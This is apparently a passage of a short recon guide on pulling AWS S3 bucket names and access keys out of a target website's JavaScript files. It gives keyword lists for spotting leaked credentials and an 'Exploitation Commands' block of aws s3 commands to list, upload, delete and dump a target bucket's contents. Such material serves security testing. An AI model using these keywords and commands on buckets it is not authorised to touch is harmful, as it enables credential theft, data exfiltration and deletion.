1. target application's HTML source code using the 'view-source' feature. Pay special attention to the JavaScript (.js) files, as they often contain Sensitive Information.
2. Frequently, sensitive information is hidden within these JavaScript files.
3. Specific keywords can be used to discover S3 bucket names and AWS access keys and secret keys. These keywords include:

AWS S3 Bucket Keywords:
```
"s3.amazonaws.com/"
"s3://"
".s3.amazonaws.com/"
"AmazonS3Encryption"
"AWS_ACCESS_KEY_ID"
"AWS_SECRET_ACCESS_KEY"
"s3.GetObject"
"s3.PutObject"
"s3.DeleteObject"
```
Access Key and Secret Key Keywords:
```
"AWS_ACCESS_KEY_ID"
"AWS_SECRET_ACCESS_KEY"
"AWS_SESSION_TOKEN"
"AccessKeyId"
"SecretAccessKey"
```
Common AWS Services Keywords:
```
"AWS_REGION"
"AWS_DEFAULT_REGION"
"AWS_DEFAULT_PROFILE"
```

4. Exploitation Commands:
```
aws s3 ls s3://[bucketname]  -- To List 
aws s3 cp ./file s3://[bucketname]  -- To Copy
aws s3 rm s3://[bucketname]/file  -- To Remove
aws s3 mv ./file s3://[bucketname]  -- To Move
aws s3 sync .path s3://[bucketname] -- To Dump Data
```
